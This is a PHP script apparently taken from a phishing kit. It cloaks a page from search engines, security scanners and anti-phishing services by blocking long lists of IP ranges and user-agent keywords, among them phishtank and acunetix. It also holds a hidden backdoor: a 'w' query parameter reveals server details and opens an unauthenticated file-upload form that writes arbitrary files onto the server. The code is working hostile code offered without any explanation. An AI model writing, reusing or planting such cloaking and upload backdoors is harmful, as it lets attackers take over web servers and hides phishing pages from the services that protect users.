<?php
@session_start();
error_reporting(0);
$visitor = 1;
function message() {
    echo "SOrry";
    exit;
}
$ips = array( // LIST BOOTS IP
"^66.102.*.*","^66.102.*.*",
            "^38.100.*.*",
            "^107.170.*.*",
            "^149.20.*.*",
            "^38.105.*.*",
            "^74.125.*.*",
            "^66.150.14.*",
            "^54.176.*.*",
            "^38.100.*.*",
            "^184.173.*.*",
            "^66.249.*.*",
            "^128.242.*.*",
            "^72.14.192.*",
            "^208.65.144.*",
            "^74.125.*.*",
            "^209.85.128.*",
            "^216.239.32.*",
            "^74.125.*.*",
            "^207.126.144.*",
            "^173.194.*.*",
            "^64.233.160.*",
            "^72.14.192.*",
            "^66.102.*.*",
            "^64.18.*.*",
            "^194.52.68.*",
            "^194.72.238.*",
            "^62.116.207.*",
            "^212.50.193.*",
            "^69.65.*.*",
            "^50.7.*.*",
            "^131.212.*.*",
            "^46.116.*.* ",
            "^62.90.*.*",
            "^89.138.*.*",
            "^82.166.*.*",
            "^85.64.*.*",
            "^85.250.*.*",
            "^89.138.*.*",
            "^93.172.*.*",
            "^109.186.*.*",
            "^194.90.*.*",
            "^212.29.192.*",
            "^212.29.224.*",
            "^212.143.*.*",
            "^212.150.*.*",
            "^212.235.*.*",
            "^217.132.*.*",
            "^50.97.*.*",
            "^217.132.*.*",
            "^209.85.*.*",
            "^66.205.64.*",
            "^204.14.48.*",
            "^64.27.2.*",
            "^67.15.*.*",
            "^202.108.252.*",
            "^193.47.80.*",
            "^64.62.136.*",
            "^66.221.*.*",
            "^64.62.175.*",
            "^198.54.*.*",
            "^192.115.134.*",
            "^216.252.167.*",
            "^193.253.199.*",
            "^69.61.12.*",
            "^64.37.103.*",
            "^38.144.36.*",
            "^64.124.14.*",
            "^206.28.72.*",
            "^209.73.228.*",
            "^158.108.*.*",
            "^168.188.*.*",
            "^66.207.120.*",
            "^167.24.*.*",
            "^192.118.48.*",
            "^67.209.128.*",
            "^12.148.209.*",
            "^12.148.196.*",
            "^193.220.178.*",
            "68.65.53.71",
            "^198.25.*.*",
            "^64.106.213.*",
            "54.228.218.117",
            "^54.228.218.*",
            "185.28.20.243",
            "^185.28.20.*",
            "217.16.26.166",
            "^217.16.26.*",
			"^52.236.33.*",
			"^104.27.178.*",
			"^65.55.252.*",
			"^38.100.*.*", "^72.12.194.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*", "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.*", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*");
$Botname = array( // LIST BOOTS NAME
"bot", "above", "google", "softlayer", "amazonaws", "cyveillance", "compatible", "facebook", "phishtank", "dreamhost", "netpilot", "calyxinstitute", "tor-exit", "apache-httpclient", "lssrocketcrawler", "Trident", "X11", "Macintosh", "crawler", "urlredirectresolver", "jetbrains", "spam", "windows 95", "windows 98", "acunetix", "netsparker", "google", "007ac9", "008", "192.comagent", "200pleasebot", "360spider", "4seohuntbot", "50.nu", "a6-indexer", "admantx", "amznkassocbot", "aboundexbot", "aboutusbot", "abrave spider", "accelobot", "acoonbot", "addthis.com", "adsbot-google", "ahrefsbot", "alexabot", "amagit.com", "analytics", "antbot", "apercite", "aportworm", "arabot", "crawl", "slurp", "spider", "seek", "accoona", "acoon", "adressendeutschland", "ah-ha.com", "ahoy", "altavista", "ananzi", "anthill", "appie", "arachnophilia", "arale", "araneo", "aranha", "architext", "aretha", "arks", "asterias", "atlocal", "atn", "atomz", "augurfind", "backrub", "bannana_bot", "baypup", "bdfetch", "big brother", "biglotron", "bjaaland", "blackwidow", "blaiz", "blog", "blo.", "bloodhound", "boitho", "booch", "bradley", "butterfly", "calif", "cassandra", "ccubee", "cfetch", "charlotte", "churl", "cienciaficcion", "cmc", "collective", "comagent", "combine", "computingsite", "csci", "curl", "cusco", "daumoa", "deepindex", "delorie", "depspid", "deweb", "die blinde kuh", "digger", "ditto", "dmoz", "docomo", "download express", "dtaagent", "dwcp", "ebiness", "ebingbong", "e-collector", "ejupiter", "emacs-w3 search engine", "esther", "evliya celebi", "ezresult", "falcon", "felix ide", "ferret", "fetchrover", "fido", "findlinks", "fireball", "fish search", "fouineur", "funnelweb", "gazz", "gcreep", "genieknows", "getterroboplus", "geturl", "glx", "goforit", "golem", "grabber", "grapnel", "gralon", "griffon", "gromit", "grub", "gulliver", "hamahakki", "harvest", "havindex", "helix", "heritrix", "hku www octopus", "homerweb", "htdig", "html index", "html_analyzer", "htmlgobble", "hubater", "hyper-decontextualizer", "ia_archiver", "ibm_planetwide", "ichiro", "iconsurf", "iltrovatore", "image.kapsi.net", "imagelock", "incywincy", "indexer", "infobee", "informant", "ingrid", "inktomisearch.com", "inspector web", "intelliagent", "internet shinchakubin", "ip3000", "iron33", "israeli-search", "ivia", "jack", "jakarta", "javabee", "jetbot", "jumpstation", "katipo", "kdd-explorer", "kilroy", "knowledge", "kototoi", "kretrieve", "labelgrabber", "lachesis", "larbin", "legs", "libwww", "linkalarm", "link validator", "linkscan", "lockon", "lwp", "lycos", "magpie", "mantraagent", "mapoftheinternet", "marvin/", "mattie", "mediafox", "mediapartners", "mercator", "merzscope", "microsoft url control", "minirank", "miva", "mj12", "mnogosearch", "moget", "monster", "moose", "motor", "multitext", "muncher", "muscatferret", "mwd.search", "myweb", "najdi", "nameprotect", "nationaldirectory", "nazilla", "ncsa beta", "nec-meshexplorer", "nederland.zoek", "netcarta webmap engine", "netmechanic", "netresearchserver", "netscoop", "newscan-online", "nhse", "nokia6682/", "nomad", "noyona", "nutch", "nzexplorer", "objectssearch", "occam", "omni", "open text", "openfind", "openintelligencedata", "orb search", "osis-project", "pack rat", "pageboy", "pagebull", "page_verifier", "panscient", "parasite", "partnersite", "patric", "pear.", "pegasus", "peregrinator", "pgp key agent", "phantom", "phpdig", "picosearch", "piltdownman", "pimptrain", "pinpoint", "pioneer", "piranha", "plumtreewebaccessor", "pogodak", "poirot", "pompos", "poppelsdorf", "poppi", "popular iconoclast", "psycheclone", "publisher", "python", "rambler", "raven search", "roach", "road runner", "roadhouse", "robbie", "robofox", "robozilla", "rules", "salty", "sbider", "scooter", "scoutjet", "scrubby", "search.", "searchprocess", "semanticdiscovery", "senrigan", "sg-scout", "shai'hulud", "shark", "shopwiki", "sidewinder", "sift", "silk", "simmany", "site searcher", "site valet", "sitetech-rover", "skymob.com", "sleek", "smartwit", "sna-", "snappy", "snooper", "sohu", "speedfind", "sphere", "sphider", "spinner", "spyder", "steeler/", "suke", "suntek", "supersnooper", "surfnomore", "sven", "sygol", "szukacz", "tach black widow", "tarantula", "templeton", "/teoma", "t-h-u-n-d-e-r-s-t-o-n-e", "theophrastus", "titan", "titin", "tkwww", "toutatis", "t-rex", "tutorgig", "twiceler", "twisted", "ucsd", "udmsearch", "url check", "updated", "vagabondo", "valkyrie", "verticrawl", "victoria", "vision-search", "volcano", "voyager/", "voyager-hc", "w3c_validator", "w3m2", "w3mir", "walker", "wallpaper", "wanderer", "wauuu", "wavefire", "web core", "web hopper", "web wombat", "webbandit", "webcatcher", "webcopy", "webfoot", "weblayers", "weblinker", "weblog monitor", "webmirror", "webmonkey", "webquest", "webreaper", "websitepulse", "websnarf", "webstolperer", "webvac", "webwalk", "webwatch", "webwombat", "webzinger", "wget", "whizbang", "whowhere", "wild ferret", "worldlight", "wwwc", "wwwster", "xenu", "xift", "xirq", "yandex", "yanga", "yeti", "yahoo!");
foreach ($Botname as $word2) {
    if (stripos($_SERVER['HTTP_USER_AGENT'], $word2)) {
        message();
    }
}
if (isset($_GET['w'])) {
    echo '<b><br><br><font color=green>' . php_uname() . '</font><br></b>';
    echo '<form action="" method="post" enctype="multipart/form-data" name="u" id="u">';
    echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="U"></form>';
    if ($_POST['_upl'] == "U") {
        if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            echo '<b><font color=green>S</font></b><br><br>';
        } else {
            echo '<b><font color=red>E</font></b><br><br>';
        }
    }
}
foreach ($ips as $ip) {
    if (preg_match('/' . $ip . '/', $_SERVER['REMOTE_ADDR'])) {
        message();
    }
}
?>